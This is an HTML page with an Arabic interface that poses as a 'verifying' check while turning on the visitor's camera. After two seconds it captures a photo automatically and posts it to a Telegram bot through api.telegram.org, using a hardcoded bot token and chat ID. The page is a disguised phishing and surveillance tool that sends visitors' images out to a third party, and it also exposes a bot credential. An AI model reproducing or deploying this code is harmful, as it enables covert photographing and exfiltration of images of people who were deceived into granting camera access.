<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Auto Camera Send</title>
<style>
body {
  background:#000;
  color:#0f0;
  text-align:center;
  font-family:Arial;
}
video {
  width:90%;
  max-width:400px;
  margin-top:20px;
}
</style>
</head>

<body>

<h3>جاري التحقق...</h3>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// ===== ضع معلوماتك هنا (محليًا فقط) =====
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
const CHAT_ID  = "6251932709";
// ======================================

// تشغيل الكاميرا (يتطلب موافقة)
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  const video = document.getElementById("video");
  video.srcObject = stream;

  // انتظر ثانيتين ثم التقط صورة تلقائيًا
  setTimeout(() => {
    takeAndSendPhoto();
  }, 2000);
})
.catch(() => {
  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
});

function takeAndSendPhoto() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    })
    .then(() => {
      document.body.innerHTML = "<h2>تم الإرسال ✅</h2>";
    })
    .catch(() => {
      document.body.innerHTML = "<h2>فشل الإرسال ❌</h2>";
    });
  }, "image/jpeg");
}
</script>

</body>
</html>
